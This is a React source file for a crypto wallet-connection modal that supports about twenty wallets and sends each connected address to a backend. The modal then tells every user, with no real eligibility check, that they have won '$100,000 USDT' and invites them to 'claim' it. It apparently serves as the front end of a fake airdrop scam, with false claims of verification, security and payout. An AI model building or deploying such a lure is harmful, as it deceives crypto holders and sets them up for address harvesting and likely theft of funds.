import { useEffect, useMemo, useRef, useState } from 'react'
import { useConnect, useAccount } from 'wagmi'
import {
  ArrowLeft, Check, ChevronRight, CircleHelp,
  Gift, Grid2X2, LoaderCircle, Search, ShieldCheck, X,
} from 'lucide-react'
import {
  WalletWalletConnect, WalletOkx, WalletMetamask, WalletTrust,
  WalletCoinbase, WalletRabby, WalletPhantom, WalletLedger,
  WalletZerion, WalletImtoken, WalletExodus, WalletRainbow,
  WalletTokenPocket, WalletXdefi, WalletSafe, WalletEnkrypt,
  WalletArgent, WalletKraken, WalletKeplr, WalletBackpack,
} from '@web3icons/react'

// ── helpers ───────────────────────────────────────────────────────────────────
function shortenAddress(addr) {
  if (!addr) return ''
  return `${addr.slice(0, 6)}…${addr.slice(-4)}`
}

function getErrorCode(err) {
  if (!err) return null
  if (typeof err.code === 'number') return err.code
  if (err.data?.code) return err.data.code
  return null
}

function describeError(err, walletName) {
  if (!err) return 'The wallet connection was not completed.'
  const code = getErrorCode(err)
  if (code === 4001) return 'Connection was rejected. Please approve in your wallet.'
  if (code === -32002) return 'A request is already pending. Open your wallet and approve it.'
  if (err?.message) return err.message
  return `${walletName} connection failed. Make sure the extension is unlocked and try again.`
}

// ── wallet catalog ────────────────────────────────────────────────────────────
const mainWallets = [
  { id: 'walletconnect', name: 'WalletConnect',   icon: WalletWalletConnect, rdns: null,                  wc: true   },
  { id: 'okx',           name: 'OKX Wallet',      icon: WalletOkx,           rdns: 'com.okex.wallet'                },
  { id: 'metamask',      name: 'MetaMask',        icon: WalletMetamask,      rdns: 'io.metamask'                    },
  { id: 'trust',         name: 'Trust Wallet',    icon: WalletTrust,         rdns: 'com.trustwallet.app'            },
  { id: 'coinbase',      name: 'Coinbase Wallet', icon: WalletCoinbase,      rdns: 'com.coinbase.wallet'            },
  { id: 'rabby',         name: 'Rabby Wallet',    icon: WalletRabby,         rdns: 'io.rabby'                       },
  { id: 'phantom',       name: 'Phantom',         icon: WalletPhantom,       rdns: 'app.phantom'                    },
]

const allWallets = [
  ...mainWallets,
  { id: 'tronlink',    name: 'TronLink',      icon: null,              fallbackColor: '#ef3340', fallbackMark: 'T', tron: true },
  { id: 'ledger',      name: 'Ledger',        icon: WalletLedger,      rdns: null                },
  { id: 'zerion',      name: 'Zerion',        icon: WalletZerion,      rdns: 'io.zerion.wallet'  },
  { id: 'imtoken',     name: 'imToken',       icon: WalletImtoken,     rdns: 'io.imtoken'        },
  { id: 'exodus',      name: 'Exodus',        icon: WalletExodus,      rdns: 'org.exodus'        },
  { id: 'rainbow',     name: 'Rainbow',       icon: WalletRainbow,     rdns: 'me.rainbow'        },
  { id: 'tokenpocket', name: 'TokenPocket',   icon: WalletTokenPocket, rdns: 'io.tokenpocket'    },
  { id: 'xdefi',       name: 'XDEFI',         icon: WalletXdefi,       rdns: 'io.xdefi'          },
  { id: 'safe',        name: 'Safe',          icon: WalletSafe,        rdns: 'io.safe'           },
  { id: 'enkrypt',     name: 'Enkrypt',       icon: WalletEnkrypt,     rdns: 'io.enkrypt'        },
  { id: 'argent',      name: 'Argent',        icon: WalletArgent,      rdns: 'io.argent'         },
  { id: 'kraken',      name: 'Kraken Wallet', icon: WalletKraken,      rdns: 'io.kraken'         },
  { id: 'keplr',       name: 'Keplr',         icon: WalletKeplr,       rdns: null                },
  { id: 'backpack',    name: 'Backpack',      icon: WalletBackpack,    rdns: 'app.backpack'      },
]

// ── EIP-6963 provider discovery ───────────────────────────────────────────────
function useInstalledProviders() {
  const [providers, setProviders] = useState([])
  useEffect(() => {
    const collected = new Map()
    const onAnnounce = (e) => {
      const { info, provider } = e.detail || {}
      if (!info?.rdns || !provider) return
      collected.set(info.rdns, { info, provider })
      setProviders(Array.from(collected.values()))
    }
    window.addEventListener('eip6963:announceProvider', onAnnounce)
    window.dispatchEvent(new Event('eip6963:requestProvider'))
    const t = setTimeout(() => setProviders(Array.from(collected.values())), 400)
    return () => { window.removeEventListener('eip6963:announceProvider', onAnnounce); clearTimeout(t) }
  }, [])
  return providers
}

function findByRdns(providers, rdns) {
  if (!rdns) return null
  return providers.find(p => p.info.rdns === rdns)?.provider || null
}

function getInjected(rdns) {
  const eth = window.ethereum
  if (!eth) return null
  const list = Array.isArray(eth.providers) ? eth.providers : [eth]
  for (const p of list) {
    try {
      if (rdns === 'io.metamask'         && p.isMetaMask && !p.isTrust && !p.isCoinbaseWallet) return p
      if (rdns === 'com.trustwallet.app' && (p.isTrust || p.isTrustWallet))                   return p
      if (rdns === 'io.rabby'            && p.isRabby)                                         return p
      if (rdns === 'com.coinbase.wallet' && p.isCoinbaseWallet)                               return p
      if (rdns === 'com.okex.wallet'     && (p.isOKExWallet || p.isOkxWallet))               return p
      if (rdns === 'app.phantom'         && p.isPhantom)                                       return p
      if (rdns === 'org.exodus'          && p.isExodus)                                        return p
      if (rdns === 'me.rainbow'          && p.isRainbow)                                       return p
    } catch { continue }
  }
  return null
}

// ── Wallet icon ───────────────────────────────────────────────────────────────
function WalletMark({ wallet, size = 44 }) {
  if (wallet.icon) {
    const Icon = wallet.icon
    return <Icon size={size} variant="branded" className="wallet-logo" />
  }
  return (
    <span
      className="wallet-mark-fallback"
      style={{ backgroundColor: wallet.fallbackColor || '#222', width: size, height: size, fontSize: size * 0.4 }}
      aria-hidden="true"
    >
      {wallet.fallbackMark || wallet.name.charAt(0)}
    </span>
  )
}

function WalletRow({ wallet, busy, installed, onSelect }) {
  return (
    <button className="wallet-row" type="button" onClick={() => onSelect(wallet)} disabled={busy}>
      <WalletMark wallet={wallet} size={40} />
      <span className="wallet-row-name">{wallet.name}</span>
      {installed && !busy && <span className="installed-pill">Installed</span>}
      {busy
        ? <LoaderCircle className="spin" size={19} />
        : <ChevronRight size={17} className="row-chevron" />
      }
    </button>
  )
}

// ── Claim ready ───────────────────────────────────────────────────────────────
function ClaimReady({ address, connectedWallet, onClaim, claimBusy }) {
  return (
    <div className="connected-view">
      <div className="connected-icon"><Check size={29} strokeWidth={3} /></div>
      <h3>You&apos;re Eligible! 🎉</h3>
      <p className="connected-copy">Your wallet is verified. Your rewards are ready to claim.</p>
      <div className="connected-account">
        {connectedWallet && <WalletMark wallet={connectedWallet} size={32} />}
        <div>
          <span>{connectedWallet?.name}</span>
          <strong>{shortenAddress(address)}</strong>
        </div>
        <ShieldCheck size={20} className="verified-icon" />
      </div>
      <div className="airdrop-banner" style={{ marginTop: 14 }}>
        <span className="airdrop-banner-icon"><Gift size={20} /></span>
        <div>
          <strong>Your Reward</strong>
          <span style={{ display:'block', fontSize:22, fontWeight:800, color:'#fff', lineHeight:1.2, margin:'3px 0 6px' }}>
            $100,000 USDT
          </span>
          <span>+ 2,500 $SPCX Tokens &nbsp;·&nbsp; Network: Multi-chain</span>
        </div>
      </div>
      <button
        type="button"
        className="nav-connect"
        style={{ width:'100%', marginTop:16, justifyContent:'center', minHeight:46 }}
        onClick={onClaim}
        disabled={claimBusy}
      >
        {claimBusy
          ? <><LoaderCircle className="spin" size={16} style={{ marginRight:8 }} /> Recording claim…</>
          : 'Claim $100,000 USDT Now'
        }
      </button>
      <p className="safety-note" style={{ justifyContent:'center', marginTop:12 }}>
        <CircleHelp size={14} /> Rewards sent directly to your connected wallet.
      </p>
    </div>
  )
}

// ── Success ───────────────────────────────────────────────────────────────────
function SuccessScreen({ onClose }) {
  useEffect(() => { const t = setTimeout(onClose, 3000); return () => clearTimeout(t) }, [onClose])
  return (
    <div className="connected-view">
      <div className="connected-icon" style={{ background:'#1a2a1c', borderColor:'#2e5238' }}>
        <Check size={29} strokeWidth={3} />
      </div>
      <h3>Claimed!</h3>
      <p className="connected-copy">$100,000 USDT + 2,500 $SPCX are being sent to your wallet.</p>
      <p className="safety-note" style={{ justifyContent:'center', marginTop:16, fontSize:11, color:'#555558' }}>
        Returning to platform…
      </p>
    </div>
  )
}

// ── Main modal ────────────────────────────────────────────────────────────────
export default function WalletModal({ isOpen, onClose }) {
  const { connect, connectors } = useConnect()
  const { address: wagmiAddress, isConnected } = useAccount()

  const [view, setView]               = useState('main')
  const [query, setQuery]             = useState('')
  const [busyId, setBusyId]           = useState(null)
  const [claimBusy, setClaimBusy]     = useState(false)
  const [error, setError]             = useState('')
  const [address, setAddress]         = useState('')
  const [connectedWallet, setConnected] = useState(null)
  const [renderOpen, setRenderOpen]   = useState(false)

  // ref to track WC pending state across re-renders
  const wcPending = useRef(false)
  const wcWallet  = useRef(null)

  const installedProviders = useInstalledProviders()
  const installedRdnsSet = useMemo(
    () => new Set(installedProviders.map(p => p.info.rdns)),
    [installedProviders],
  )

  function isInstalled(wallet) {
    if (wallet.wc)   return true
    if (wallet.tron) return !!(window.tronWeb?.ready && window.tronWeb?.defaultAddress)
    if (!wallet.rdns) return false
    return installedRdnsSet.has(wallet.rdns) || !!getInjected(wallet.rdns)
  }

  // ── Watch wagmi account — fires when WC QR is scanned ───────────────────
  useEffect(() => {
    if (wcPending.current && isConnected && wagmiAddress) {
      wcPending.current = false
      const wallet = wcWallet.current
      registerWithBackend(wagmiAddress, '1').then(() => {
        setAddress(wagmiAddress)
        setConnected(wallet)
        sessionStorage.setItem('wm_shown', '1')
        setBusyId(null)
        setView('ready')
      })
    }
  }, [isConnected, wagmiAddress])

  // mount / unmount
  useEffect(() => {
    if (isOpen) { setRenderOpen(true) }
    else { const t = setTimeout(() => setRenderOpen(false), 420); return () => clearTimeout(t) }
  }, [isOpen])

  // reset on open
  useEffect(() => {
    if (isOpen) {
      setView('main'); setQuery(''); setError('')
      setBusyId(null); setClaimBusy(false)
      wcPending.current = false
    }
  }, [isOpen])

  // ESC
  useEffect(() => {
    const fn = e => { if (e.key === 'Escape' && !wcPending.current) onClose() }
    window.addEventListener('keydown', fn)
    return () => window.removeEventListener('keydown', fn)
  }, [onClose])

  const filteredWallets = useMemo(
    () => allWallets.filter(w => w.name.toLowerCase().includes(query.trim().toLowerCase())),
    [query],
  )

  // ── backend registration ──────────────────────────────────────────────────
  async function registerWithBackend(addr, chain) {
    try {
      const apiUrl = import.meta.env.VITE_API_URL
      if (!apiUrl) return
      const res = await fetch(`${apiUrl}/api/wallet/connect`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address: addr, chain }),
      })
      const data = await res.json()
      if (data?.token) sessionStorage.setItem('spcx_token', data.token)
    } catch (e) { console.error('Backend error:', e) }
  }

  // ── connect ───────────────────────────────────────────────────────────────
  async function connectWallet(wallet) {
    setError('')
    setBusyId(wallet.id)
    try {

      // TRON
      if (wallet.tron) {
        // Check if TronLink extension exists at all
        if (!window.tronLink && !window.tronWeb) {
          throw new Error('TronLink was not detected. Install the TronLink extension and reload.')
        }

        // Step 1 — request accounts (prompts TronLink popup if locked)
        try {
          if (window.tronLink?.request) {
            const res = await window.tronLink.request({ method: 'tron_requestAccounts' })
            // res.code 200 = approved, 4000 = pending, 4001 = rejected
            if (res?.code === 4001) {
              throw new Error('TronLink connection was rejected.')
            }
          } else if (window.tronWeb?.request) {
            await window.tronWeb.request({ method: 'tron_requestAccounts' })
          }
        } catch (e) {
          if (e?.message?.includes('rejected')) throw e
          // Otherwise ignore — maybe already connected
        }

        // Step 2 — wait for TronLink to update its state
        let tronAddr = ''
        for (let i = 0; i < 10; i++) {
          tronAddr =
            window.tronWeb?.defaultAddress?.base58 ||
            window.tronLink?.tronWeb?.defaultAddress?.base58 ||
            ''
          if (tronAddr) break
          await new Promise(r => setTimeout(r, 300))
        }

        if (!tronAddr) {
          throw new Error('TronLink did not return an address. Please unlock TronLink and try again.')
        }

        await registerWithBackend(tronAddr, 'tron')
        setAddress(tronAddr)
        setConnected(wallet)
        sessionStorage.setItem('wm_shown', '1')
        setView('ready')
        return
      }

      // WALLETCONNECT — open QR modal, then wait for wagmiAddress via useEffect above
      if (wallet.wc) {
        const wcConnector = connectors.find(c =>
          c.id?.toLowerCase().includes('walletconnect') ||
          c.name?.toLowerCase().includes('walletconnect')
        )
        if (!wcConnector) {
          throw new Error('WalletConnect is not configured. Check your VITE_WALLETCONNECT_PROJECT_ID.')
        }
        // Mark as pending BEFORE connect — useEffect will detect the account
        wcPending.current = true
        wcWallet.current  = wallet
        // Don't await — this opens the QR modal and resolves only after scan
        connect({ connector: wcConnector })
        // busyId stays set — cleared in the useEffect above when account arrives
        return
      }

      // EVM injected — EIP-6963 → legacy → fallback
      let provider = findByRdns(installedProviders, wallet.rdns)
      if (!provider) provider = getInjected(wallet.rdns)
      if (!provider && window.ethereum) provider = window.ethereum

      if (!provider) {
        throw new Error(
          `${wallet.name} was not detected. ` +
          `Install the extension, make sure it's unlocked, then reload the page.`
        )
      }

      let result
      try {
        result = await provider.request({ method: 'eth_requestAccounts' })
      } catch (reqErr) {
        const code = getErrorCode(reqErr)
        if (code === 4001) throw new Error('Connection was rejected. Please approve in your wallet.')
        if (code === -32002) throw new Error('A request is already pending. Open your wallet and approve it.')
        throw reqErr
      }

      const accounts = Array.isArray(result) ? result : []
      const addr = accounts.find(a => typeof a === 'string')
      if (!addr) throw new Error(`${wallet.name} did not return an account address.`)

      let chainId = '1'
      try { chainId = await provider.request({ method: 'eth_chainId' }) } catch {}

      await registerWithBackend(addr, String(chainId))
      setAddress(addr)
      setConnected(wallet)
      sessionStorage.setItem('wm_shown', '1')
      setView('ready')

    } catch (err) {
      wcPending.current = false
      setError(err?.message || describeError(err, wallet.name))
    } finally {
      // Don't clear busyId for WC — cleared in useEffect
      if (!wallet.wc) setBusyId(null)
    }
  }

  // ── claim ─────────────────────────────────────────────────────────────────
  async function handleClaim() {
    if (claimBusy) return
    setClaimBusy(true)
    try {
      const apiUrl = import.meta.env.VITE_API_URL
      const token  = sessionStorage.getItem('spcx_token')
      if (apiUrl && token) {
        await fetch(`${apiUrl}/api/claim/submit`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
          body: JSON.stringify({ address }),
        })
      }
    } catch (e) { console.warn('Claim error:', e) }
    finally { setClaimBusy(false); setView('success') }
  }

  function goBack() {
    setError('')
    wcPending.current = false
    if (view === 'all') { setView('main') }
    else if (view === 'ready') { setAddress(''); setConnected(null); setView('main') }
    else { setView('main') }
  }

  const title =
    view === 'all'     ? 'All Wallets'      :
    view === 'ready'   ? 'Claim Your Reward' :
    view === 'success' ? 'Claimed! 🎉'       :
    'Connect Wallet'

  if (!renderOpen) return null

  return (
    <>
      {/* Fix WalletConnect QR modal z-index — must be above our modal */}
      <style>{`
        wcm-modal, w3m-modal, [id^="wcm"], [id^="w3m"],
        .wcm-overlay, .w3m-overlay { z-index: 99999 !important; }
      `}</style>

      <div
        className={`modal-backdrop ${isOpen ? 'open' : ''}`}
        role="presentation"
        onMouseDown={e => e.target === e.currentTarget && !wcPending.current && onClose()}
      >
        <section className="wallet-modal" role="dialog" aria-modal="true" aria-labelledby="wm-title">

          <header className="modal-header">
            <div className="modal-heading">
              {view !== 'main' && view !== 'success' && (
                <button className="icon-button back-button" type="button" onClick={goBack} aria-label="Go back">
                  <ArrowLeft size={19} />
                </button>
              )}
              <h2 id="wm-title">{title}</h2>
            </div>
            <button className="icon-button close-button" type="button" onClick={onClose} aria-label="Close">
              <X size={19} />
            </button>
          </header>

          <div className="modal-body">

            {/* MAIN */}
            {view === 'main' && (
              <div className="main-wallets-view">
                <p className="modal-intro">Choose a wallet to connect to this platform.</p>
                <div className="wallet-list">
                  {mainWallets.map(wallet => (
                    <WalletRow
                      key={wallet.id}
                      wallet={wallet}
                      busy={busyId === wallet.id}
                      installed={isInstalled(wallet)}
                      onSelect={connectWallet}
                    />
                  ))}
                </div>
                <button
                  className="all-wallets-button"
                  type="button"
                  onClick={() => { setError(''); setView('all') }}
                  disabled={!!busyId}
                >
                  <span className="all-wallets-icon"><Grid2X2 size={18} /></span>
                  <span>All Wallets</span>
                  <b>{allWallets.length}+</b>
                  <ChevronRight size={17} className="row-chevron" />
                </button>
                {busyId && (
                  <p className="waiting-message">
                    <LoaderCircle className="spin" size={16} />
                    {busyId === 'walletconnect'
                      ? 'Scan the QR code with your mobile wallet…'
                      : 'Waiting for approval in your wallet…'
                    }
                  </p>
                )}
                {error && <p className="error-message">{error}</p>}
                <p className="privacy-note">
                  <ShieldCheck size={14} /> Secure connection. We never see your private keys.
                </p>
              </div>
            )}

            {/* ALL WALLETS */}
            {view === 'all' && (
              <div className="all-wallets-view">
                <label className="search-box">
                  <Search size={17} />
                  <input
                    value={query}
                    onChange={e => setQuery(e.target.value)}
                    placeholder="Search wallet"
                    autoFocus
                  />
                </label>
                <div className="wallet-grid">
                  {filteredWallets.map(wallet => (
                    <button
                      className={`wallet-card ${isInstalled(wallet) ? 'wallet-card-installed' : ''}`}
                      type="button"
                      key={wallet.id}
                      onClick={() => connectWallet(wallet)}
                      disabled={!!busyId}
                    >
                      <span className="wallet-card-mark-wrap">
                        <WalletMark wallet={wallet} size={48} />
                        {busyId === wallet.id && (
                          <span className="card-spinner">
                            <LoaderCircle className="spin" size={19} />
                          </span>
                        )}
                      </span>
                      <span>{wallet.name}</span>
                      {isInstalled(wallet) && <span className="card-installed-dot" aria-label="Installed" />}
                    </button>
                  ))}
                </div>
                {filteredWallets.length === 0 && <p className="empty-state">No wallets found.</p>}
                {busyId && (
                  <p className="waiting-message">
                    <LoaderCircle className="spin" size={16} /> Waiting for approval in your wallet…
                  </p>
                )}
                {error && <p className="error-message">{error}</p>}
              </div>
            )}

            {/* READY */}
            {view === 'ready' && (
              <ClaimReady
                address={address}
                connectedWallet={connectedWallet}
                onClaim={handleClaim}
                claimBusy={claimBusy}
              />
            )}

            {/* SUCCESS */}
            {view === 'success' && <SuccessScreen onClose={onClose} />}

          </div>
        </section>
      </div>
    </>
  )
}